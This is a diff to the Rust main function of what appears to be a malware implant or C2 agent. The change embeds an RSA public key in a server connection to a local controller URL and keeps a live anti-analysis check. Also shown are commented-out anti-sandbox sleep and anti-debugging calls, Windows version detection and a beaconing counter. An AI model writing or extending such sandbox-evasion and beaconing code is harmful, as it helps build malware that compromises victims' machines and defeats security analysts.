@@ -50,16 +50,23 @@ async fn main() {
     // //anti sandbox
     // // sleep(Duration::from_secs(600)).await;
 
-    // // check_for_debugging();
-    // // check_for_process();
-
     check_for_analysis_behaviour();
 
     const URL: &'static str = "http://127.0.0.1:5000";
 
+    let pub_key ="-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkVLiPyzANDNB3e4oWAFS
+dysBxnZG1Yc0Oa5KfRCETlmKC6saB3LfFm+LwM0auaOB+S0/H6gXSviIJ1FlP56E
+c6G1gRJ7hCTJQE4j4mr9fq9+OF6NMmh6tVjtVeu3LJtFTLdV0C+yeWRL88KUazkI
+9TrbtoFfLs02dlYMynvJ4ugH+J2VM2wvbWAV4O9z2tEXEaWP1ah5L+bilyphmVkT
+TdRbb1M2OCTM+XahkjxEWoXAJsbHYBMZpi1F+9xhmfoM+wNp24KOMQ6JjaB7sV9L
+hOfGW6eoyvxwP9yAKMNKAWxGpLp/m9FYAAJ+kILF04T3JA9yONe5ykl37oTKmFeD
+iwIDAQAB
+-----END PUBLIC KEY-----".to_string();
+
     //All the mutex code for sharing with different threads 
     let paused = Arc::new(AtomicBool::new(false));
-    let server = Arc::new(server::Connection::new(&URL, rand::thread_rng().gen_range(0..255)));
+    let server = Arc::new(server::Connection::new(&URL, rand::thread_rng().gen_range(0..255), pub_key));
     let arch = get_windows_version();
 
     let mut counter_beconing = 0;
